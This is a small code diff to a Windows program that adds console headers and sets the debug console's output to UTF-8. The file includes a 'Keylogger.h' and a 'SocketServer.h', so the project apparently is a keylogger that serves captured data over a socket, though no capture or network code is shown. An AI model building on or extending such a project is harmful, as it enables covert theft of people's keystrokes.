@@ -20,6 +20,8 @@
 #include <stdio.h>
 #include <chrono>
 #include <ctime>
+#include <fcntl.h>
+#include <io.h>
 
 #include "Keylogger.h"
 #include "SocketServer.h"
@@ -44,6 +46,7 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	// Add console for debug
 	AllocConsole();
 	freopen("CONOUT$", "w", stdout);
+	_setmode(_fileno(stdout), _O_U8TEXT);
 	freopen("CONOUT$", "w", stderr);
 
 	MSG msg;
